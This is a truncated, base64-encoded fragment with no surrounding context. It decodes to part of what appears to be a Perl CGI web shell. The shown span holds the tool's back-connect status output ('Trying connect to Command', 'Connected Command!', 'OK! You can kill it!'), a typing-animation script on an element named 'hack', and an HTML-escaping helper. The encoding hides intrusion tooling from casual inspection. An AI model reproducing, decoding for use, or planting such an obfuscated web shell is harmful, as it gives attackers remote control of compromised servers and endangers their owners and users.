vcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBDaGVja2luZyBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KDQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD5cJCBDb25uZWN0ZWQgQ29tbWFuZCEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+DQo8L3RyPg0KPC90Ym9keT48L3RhYmxlPg0KPGJyPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsNClR5cGluZ1RleHQucnVuQWxsKCk7DQoNCjwvc2NyaXB0Pg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0…